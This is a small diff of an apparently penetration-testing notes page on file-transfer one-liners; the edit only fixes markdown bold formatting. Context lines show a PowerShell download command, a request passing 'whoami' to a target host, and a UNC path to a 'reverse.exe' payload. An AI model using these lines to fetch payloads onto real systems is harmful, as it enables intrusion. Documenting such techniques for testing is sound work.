@@ -12,7 +12,7 @@ https://zetc0de.github.io/post/powershell-download-file-one-liners/
 
 ### POWERSHELL
 
-**PowerShell (any version) **
+**PowerShell (any version)**&#x20;
 
 ```
 (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")
@@ -37,7 +37,7 @@ PS C:> $wc.DownloadString("http://target/?whoami")
 \\192.168.1.1\share\reverse.exe
 ```
 
-**FTP - **Look details at under this node for non interactive shells.
+**FTP -** Look details at under this node for non interactive shells.
 
 ## Linux
 
